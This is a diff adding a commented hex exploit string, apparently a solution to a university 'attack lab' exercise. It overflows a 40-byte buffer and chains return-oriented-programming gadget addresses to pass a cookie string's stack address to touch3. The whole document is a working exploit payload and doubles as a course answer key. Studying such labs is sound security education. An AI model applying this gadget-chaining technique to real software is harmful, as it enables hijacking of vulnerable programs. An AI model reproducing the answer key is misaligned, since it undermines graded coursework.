@@ -1,0 +1,39 @@
+/* Overwriting the buffer named buf. We could use any other byte encoding. */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Overwriting the return address with the address of a gadget. The gadget address is 0x401aad. The gadget is movq %rsp,%rax | nop | retq. */
+ad 1a 40 00 00 00 00 00
+
+/* Address of a gadget. The gadget is movq %rax,%rdi | nop | retq */
+c5 19 40 00 00 00 00 00
+
+/* Address of a gadget. The gadget popq %rax | nop | retq */
+cc 19 40 00 00 00 00 00
+
+/* Offset to cookie */
+48 00 00 00 00 00 00 00
+
+/* Address of a gadget. The gadget is movl %eax,%edx | testb %al | retq */
+42 1a 40 00 00 00 00 00
+
+/* Address of a gadget. The gadget is movl %edx,%ecx | orb %bl | retq */
+69 1a 40 00 00 00 00 00
+
+/* Address of a gadget. The gadget is movl %ecx,%esi | nop | nop | retq */
+13 1a 40 00 00 00 00 00
+
+/* Address of the function add_xy */
+d6 19 40 00 00 00 00 00
+
+/* Address of a gadget. The gadget is movq %rax,%rdi | nop | retq */
+c5 19 40 00 00 00 00 00
+
+/* Address of the function touch3 */
+fa 18 40 00 00 00 00 00
+
+/* cookie string representation */
+35 39 62 39 39 37 66 61
